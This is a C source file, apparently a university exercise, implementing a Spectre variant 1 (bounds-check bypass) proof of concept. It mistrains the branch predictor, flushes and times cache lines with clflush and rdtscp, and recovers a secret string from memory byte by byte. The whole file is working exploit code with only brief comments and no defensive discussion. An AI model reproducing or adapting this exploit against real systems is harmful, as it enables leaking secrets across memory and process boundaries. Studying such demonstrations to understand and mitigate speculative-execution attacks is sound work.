/*
*   Copyright © 2019
*
*   Francisco Javier Blázquez Martínez ~ frblazqu@ucm.es
*
*   Double degree in Mathematics-Computer engineering.
*   École Politechnique Fédérale de Lausanne, Switzerland
*   Complutense university of Madrid, Spain
*
*   Description:
*   Spectre attack example
*/

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

const int shuffle[256] = {145,184,23,80,4,191,94,133,164,244,207,178,47,157,225,18,102,235,125,19,242,40,168,189,15,9,139,116,218,106,56,212,224,159,219,255,107,72,28,211,45,234,39,62,114,248,194,213,243,51,193,196,64,221,245,252,52,61,144,162,120,108,55,155,13,98,216,0,46,209,152,29,35,73,53,131,93,233,57,66,203,96,31,117,12,186,43,105,17,156,63,166,205,214,115,84,177,174,121,149,241,190,200,5,26,86,104,206,48,27,38,87,182,77,188,42,195,22,76,163,134,119,41,239,185,3,227,58,183,88,109,217,85,240,222,160,89,100,59,81,129,175,179,20,253,36,136,204,199,113,60,34,161,8,132,142,143,127,49,122,237,7,180,67,78,33,90,6,150,140,172,197,110,220,103,146,123,247,228,232,91,187,154,126,249,254,202,70,25,135,1,231,30,14,230,10,167,37,181,173,210,68,128,238,11,215,246,74,165,170,71,169,65,79,208,54,83,251,148,226,171,198,21,2,141,229,16,192,32,223,82,101,124,153,151,44,138,69,147,112,158,118,75,236,50,97,201,137,130,99,92,111,176,95,24,250};


unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 * @param values      The two most likely guesses returned by your attack
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {

  int THRESHOLD = 60;
  int hit_count[256] = {0};
  int repetitions = 100;


  for(int i = 0; i < repetitions; i++){
    
    // 1.- Flush array2 from the cache
    for (int i = 0; i < 256; i++) 
      _mm_clflush(&array2[i * 512]);
    for (volatile int i = 0; i < 100; i++)
      /* Intentionally */;
    _mm_mfence();

    // 2.- Extend the side channel
    _mm_clflush(&malicious_x);
    for (volatile int i = 0; i < 100; i++)
      /* Intentionally */;
    _mm_mfence();

    // 3.- Create a dummy global branch history
    for (int i = 0; i <=4096; i++)
    for (int j = 0; j < 4096; j++)
      temp ^= j;

    // 4.- Invoke victim function with valid values
    for (int i = 0; i <=1024; i++)
    for (int j = 0; j < 128;  j++)
        victim_function(0);

    // 5.- Invoke victim function
    victim_function(malicious_x);


    // 6.- Guess the malicious_x
    for (int i = 0; i < 256; ++i) {
      volatile unsigned int junk = 0;
      uint64_t s0 = __rdtscp((uint32_t *)&junk);
      junk = array2[shuffle[i] * 512];
      uint64_t delta = __rdtscp((uint32_t *)&junk) - s0;
      if (delta < THRESHOLD) hit_count[shuffle[i]]++;
    }
  }

  // find the index with maximum probability
  value[0] = 0, value[1] = 0;
  score[0] = 0, score[1] = 0;

  for (int i = 0; i < 256; i++) {
    if (hit_count[shuffle[i]] >= score[0]) {
        value[1] = value[0];
        score[1] = score[0];

        value[0] = shuffle[i];
        score[0] = hit_count[shuffle[i]];
    }
    // printing the distribution of the hit count
    printf("%4d: %4d\t", i, hit_count[shuffle[i]]);
    if (i % 8 == 7) printf("\n");
  }
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return (0);
}
